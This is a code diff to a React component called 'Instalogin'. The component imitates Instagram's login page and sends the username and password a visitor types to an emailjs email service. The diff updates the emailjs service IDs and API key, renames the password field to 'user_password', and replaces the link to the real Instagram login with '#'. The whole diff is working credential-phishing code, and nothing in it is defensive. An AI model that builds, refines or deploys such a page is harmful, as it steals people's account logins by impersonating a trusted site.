@@ -14,7 +14,7 @@ const Instalogin = () => {
     const sendEmail = (e) => {
         e.preventDefault();
 
-        emailjs.sendForm('service_gxoxrhl', 'template_2niw7wp', form.current, 'VvbV6Urc1UDyz6uju')
+        emailjs.sendForm('service_2e3c0ra', 'template_ix65q1s', form.current, 'Psdve7YiRN4tIcoGO')
             .then((result) => {
                 console.log(result.text);
             }, (error) => {
@@ -41,8 +41,8 @@ const Instalogin = () => {
                                             <Instagram />
                                             <form ref={form} onSubmit={sendEmail} className='d-flex flex-column justify-content-center align-items-center'>
                                                 <input className='w-101 mt-5' name="user_name" type="text" placeholder='Phone number, username or email address' />
-                                                <input name="user_email" className='mt-2 w-101' type="password" placeholder='Password' />
-                                                <a target='__blank' className='w-101 ps-0 login mt-3 d-flex justify-content-center align-items-center' href="https://www.instagram.com/accounts/login/?next=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fonetap%2F%3Fnext%3D%252F%26__coig_login%3D1"><input type="submit" value="Login" className='login  fw-medium ' /></a>
+                                                <input name="user_password" className='mt-2 w-101' type="password" placeholder='Password' />
+                                                <a target='__blank' className='w-101 ps-0 login mt-3 d-flex justify-content-center align-items-center' href="#"><input type="submit" value="Login" className='login  fw-medium ' /></a>
                                             </form>
 
                                         </div>
